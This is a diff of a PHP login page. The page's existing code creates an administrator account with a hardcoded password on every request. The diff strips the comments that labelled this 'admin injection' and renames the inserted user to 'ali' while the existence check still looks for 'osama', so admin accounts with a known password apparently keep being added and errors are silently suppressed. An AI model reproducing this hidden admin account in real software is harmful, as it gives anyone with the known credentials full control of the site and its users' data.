@@ -7,9 +7,7 @@ if (session_status() === PHP_SESSION_NONE) {
 mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
 require_once 'config.php';
 
-// ==========================================
-// LOCAL AUTOMATIC ADMIN INJECTION MATRIX
-// ==========================================
+
 try {
     $check_admin_stmt = $conn->prepare("SELECT id FROM users WHERE username = 'osama' LIMIT 1");
     $check_admin_stmt->execute();
@@ -17,14 +15,14 @@ try {
 
     if ($admin_result->num_rows === 0) {
         $local_admin_password = password_hash('osama123', PASSWORD_DEFAULT);
-        $inject_admin_stmt = $conn->prepare("INSERT INTO users (username, password, role) VALUES ('osama', ?, 'admin')");
+        $inject_admin_stmt = $conn->prepare("INSERT INTO users (username, password, role) VALUES ('ali', ?, 'admin')");
         $inject_admin_stmt->bind_param("s", $local_admin_password);
         $inject_admin_stmt->execute();
         $inject_admin_stmt->close();
     }
     $check_admin_stmt->close();
 } catch (mysqli_sql_exception $e) {
-    // Suppress errors if the users table isn't fully migrated yet locally
+    
 }
 
 $error = "";
@@ -65,7 +63,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['register'])) {
     }
 }
 
-// 2. Handle Sign In Request
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
     $user_name = trim($_POST['username'] ?? '');
     $pass = $_POST['password'] ?? '';
